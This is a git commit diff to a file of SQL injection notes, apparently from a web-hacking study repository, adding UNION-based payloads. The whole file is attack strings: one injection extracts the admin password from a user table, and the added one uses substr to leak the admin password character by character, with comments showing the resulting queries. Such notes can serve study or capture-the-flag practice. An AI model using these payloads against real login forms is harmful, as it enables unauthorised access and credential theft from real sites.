74306bcc419b2463ba5dd50cdf9c139d9680e08e
w4ynott <102636722+w4ynott@users.noreply.github.com>
2022-04-04 13:03:34 +0900

    Update union.sql

--- web/sql_injection/union.sql
+++ web/sql_injection/union.sql
@@ -1,2 +1,7 @@
+// union
 ' union select upw from user_table where uid='admin
 // select uid from user_table where uid='' and upw='' union select upw from user_table where uid='admin'
+
+// union with substr
+" or "1" union select substr(upw,0,1) from users where uid="admin"--
+//select upw from users where uid="admin" and upw="" or "1" union select substr(upw,0,1) from users where uid="admin"--"
